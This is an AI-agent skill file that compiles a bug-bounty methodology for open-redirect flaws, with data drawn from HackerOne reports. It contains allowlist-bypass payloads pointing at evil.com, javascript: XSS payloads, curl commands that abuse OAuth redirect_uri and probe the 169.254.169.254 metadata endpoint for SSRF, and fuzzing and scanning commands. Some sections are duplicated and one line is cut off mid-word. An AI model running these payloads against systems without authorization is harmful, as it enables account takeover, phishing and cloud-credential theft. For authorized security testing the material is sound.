---
name: bbhunt-open-redirect
description: "Use for user-controlled redirect targets and their chains: OAuth code/token theft, trusted-origin phishing, and redirect-allowlist confusion. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Open Redirect — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Inventory every redirect parameter across login, logout, OAuth, invite and post-action flows.
2. Test the full spectrum: absolute external URL, scheme-relative `//evil`, backslash tricks, encoded separators, and userinfo confusion.
3. Probe allowlist logic: suffix vs prefix, unescaped dot, subdomain of allowed domain, allowed domain on attacker domain, fragment/query placement.
4. Check whether the app follows chained redirects and whether a trusted open redirect can bypass another component's allowlist.
5. Do not stop at the redirect: find the consequence (OAuth code/token, credential capture on a trusted origin, SSRF allowlist bypass).

### Signals

- next=, return=, url=, dest=, redirect_uri, continue, to parameters
- Location header built from user input
- An allowlist of domains or paths implemented with prefix/regex matching

### Kill criteria

- No chain to a security consequence — a bare open redirect is usually informational.
- Redirect target is restricted to a trusted set you cannot escape.

### Escalation chains

- Open redirect -> OAuth redirect_uri acceptance -> auth code theft -> ATO.
- Trusted-domain redirect -> credential phishing with valid TLS/hostname.
- Open redirect -> SSRF allowlist bypass.

### Veteran tip

Corpus case studies repeatedly show open redirect as the *first* link in an ATO chain; that is where its value lives.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.
- Test scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.
- Bypass allowlists with userinfo, subdomain suffix, and path confusion.
- Check login/logout, OAuth callbacks, shorteners, and mobile deep links.

### Deeper checklist

- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.
- Try scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.
- Bypass allowlists with userinfo tricks, subdomain suffix, and path confusion.
- Test redirectors in OAuth/SSO flows and mobile deep links.
- Chain with OAuth token theft or SSRF allowlist bypass for higher impact.
- Confirm the browser actually navigates off-domain (not just a 302 to an error page).

### Web-Research Methodology Additions (2026)

Research basis: the Intigriti researcher guide "Open URL redirects: A complete guide" (Jan 2025, updated Oct 2026) and HackTricks "Open Redirect" (parser differentials, allowlist footguns, modern XSS pivots, 2024-2026 CVE chains). Both stress the escalation theme already in this skill: many programs reject a standalone redirect — prove impact (OAuth code/token theft, XSS, SSRF, CSRF) or don't submit.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Expanded parameter list:** `return_to`, `return_path`, `rurl`, `redirect_url`, `redirect_uri`, `success_url`, `cancel_url`, `image_url`, `checkout_url`, `clickurl`, `jump`, `jump_url`, `goto`, `forward`, `forward_url`, `pic`, `originUrl`, `desturl`, `request`, `backurl`, `RedirectUrl`, `ReturnUrl`, `burl`, `qurl`, `u`, `u1`, `page`, `uri`, `link`, `src`, `service`, `sp_url`.
- **Where to look:** sign-in/register/sign-out, password-reset token links (the generated link itself may carry a redirect param), profile, email-verification links, error pages, and any multi-step action.
- **Server vs client type:** a 3xx + `Location:` header is server-side; a redirect after a delay with no `Location` is client-side (meta refresh / JS). Client-side is the one that can escalate to DOM XSS.
- **SPA sinks in JS bundles:** `location.assign/replace/href`, `window.open`, `history.pushState/replaceState`, `hashchange`, `postMessage` handlers that read query/hash, framework helpers for `next`/`returnUrl`.
- **OAuth/OIDC allowlist footguns:** `redirect_uri`, `returnTo`, `RelayState` validated by regex/glob, wildcard-only host patterns, or "validate parsed URL, redirect raw input" mismatches. Repeat tests with a victim already authenticated to the IdP (silent approval).
- **SVG uploads** with `onload="window.location=..."` as a redirect/XSS pivot.
- **Modern CVE-shaped chains:** fragment smuggling + client-side path traversal (Grafana-style `redirectTo=/%23/..//\//attacker.com`) reaching an auth-token-rotate endpo

### Signals and surfaces

### Signal

- Reports: **385** · paid: **78**
- Median bounty **$300** · p90 **$1,120** · max **$3,000** · total **$39,824**
- Median upvotes **12**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| X / xAI | 17 | $8,120 | 787 |
| Internet Bug Bounty | 4 | $5,400 | 79 |
| Uber | 7 | $5,000 | 217 |
| HackerOne | 22 | $2,000 | 550 |
| Slack | 8 | $1,600 | 61 |
| Open-Xchange | 2 | $1,566 | 63 |
| Shopify | 20 | $1,500 | 347 |
| LocalTapiola | 7 | $1,200 | 70 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`next` `url` `return` `redirect` `redirect_uri` `continue` `dest` `callback` `image_url` `checkout`

### Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

### Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

### Techniques, payloads and bypasses

### Payloads & probes

- `//evil.com` `https://target.com@evil.com` `https://target.com.evil.com`
- `https://target.com\@evil.com` `//evil.com/%2e%2e` `////evil.com`
- `javascript:alert(1)` `data:text/html,...` when the redirect is client-side
- `https://target.com/redirect?url=https://evil.com` chained

### Payload bank

**36 curated payloads** in 3 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Allowlist & parser bypass

```text
https://target.com@evil.com
https://target.com.evil.com
https://target.com\@evil.com
https://target.com%2f@evil.com
https://target.com%00.evil.com
https://target.com%20.evil.com
https://target.com#@evil.com
https://target.com?@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com/redirect?url=https://evil.com
//target.com.evil.com
//target.com@evil.com
//target.com%2f@evil.com
```

### Bypass tricks

- Double URL-encode, unicode normalize, and mixed case the scheme/host.
- Use an allowlisted host with an open redirect to reach the final target.
- Exploit parser differences between validation and navigation.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357
  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…
- **XSS and Open Redirect on MoPub Login** — `#683298` · X / xAI · $1,540 · ▲248
  > Here's a proof of concept using the URL javascript:alert("proof of concept"):
- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188
  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.
- **Open redirect at https://inventory.upserve.com/http://google.com/** — `#469803` · Upserve · $1,200 · ▲179
  > https://inventory.upserve.com/http://stanko.sh/
- **Open Redirect in Logout & Login** — `#1788006` · Expedia Group Bug Bounty · $0 · ▲171
  > GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2
- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151
  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.
- **Open redirect due to scanning QR code via brave browser** — `#1946534` · Brave Software · $0 · ▲148
  > https://resources.infosecinstitute.com/topic/security-attacks-via-malicious-qr-

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `wp_redirect()` |
| 3× | `$count = 1` |
| 3× | `<script> / window.opener.location = 'https://davidebove.com/blog/2016/05/05/target_blank-vulnerability-test-page/'; / </script>` |
| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |
| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |
| 2× | `str_replace()` |
| 2× | `wp_safe_redirect()` |
| 2× | `get_target_url()` |
| 2× | `wp_sanitize_redirect()` |
| 2× | `wp_validate_redirect()` |
| 2× | `@` |
| 1× | `GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1 / Host: xfarr-6fmjyrz2lq-uc-a-run.app` |
| 1× | `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F` |
| 1× | `KA_DOMAIN_REGEX.test()` |
| 1× | `isKhanAcademyUrl()` |
| 1× | `maybeAddAuthTransfer()` |
| 1× | `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/` |
| 1× | `https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/` |
| 1× | `/..//google.com` |
| 1× | `/../` |

_...and 3 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-OPEN-REDIRECT — Open Redirect

### Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

### C. Validation / proof bar — how to confirm and avoid false positives

- **Basic proof:** the `Location` header (or meta-refresh/JS target) points to your controlled domain, and a real browser follows it there. Use `curl -s -I --max-redirs 0` to inspect raw `Location`.
- **DOM redirects need a browser:** curl cannot observe a JS/meta redirect — open the URL and confirm navigation, then trace the sink with DOM Invader or Untrusted Types.
- **Parser differentials must be browser-proven:** the server accepting a crafted string is not enough; show the browser actually navigates off-site (userinfo/backslash/`%E3%80%82` cases are parser-specific).
- **OAuth chain proof:** repeat with the victim authenticated to the IdP to get silent approval, and show a captured code/token plus a session created in the victim's account. Don't claim ATO from an unauthenticated redirect alone.
- **SSRF chain proof:** show an actual internal/metadata response returned through the followed redirect.
- **Avoid false positives:** a relative-path-only "redirect," a fallback to a default path, or a `javascript:` payload that never reaches a sink are not open redirects. Many programs reject standalone redirect reports — lead with the chain and its impact.
- **Dual-surface:** check both server-side and client-side redirectors; fixing one path often leaves the other.

- **Header proof:** show the raw `Location` pointing at your controlled host with `curl -I --max-redirs 0`, then show a browser navigating there.
- **DOM proof:** use DOM Invader to show the source→sink flow (e.g. `?url=` → `location.href`)

### Escalation and related chains

### Escalation chains

- Open redirect -> OAuth token theft.
- Open redirect -> SSRF allowlist bypass.
- Open redirect -> phishing.

### Phase 4 — OAuth Chain Test

```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)

```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

### Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

### Tools and wordlists

### Tools

`Burp` · `gf redirect` · `waybackurls` · `ffuf`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_open-redirect.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_open-redirect.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` | 36 |
| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_open-redirect.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_open-redirect.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_open-redirect.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Feed redirect params from the wordlist; verify the final Location is off-domain.

```sh
nuclei -u https://target -tags redirect,open-redirect \
       -severity low,medium,high,critical -rl 40 -o nuclei_open-redirect.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/redirect -dast \
       -rl 40 -o nuclei_open-redirect_redirect.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_open-redirect_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-open-redirect`
- `hunting` — `open-redirect`
- `cbh` — `hunt-open-redirect`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
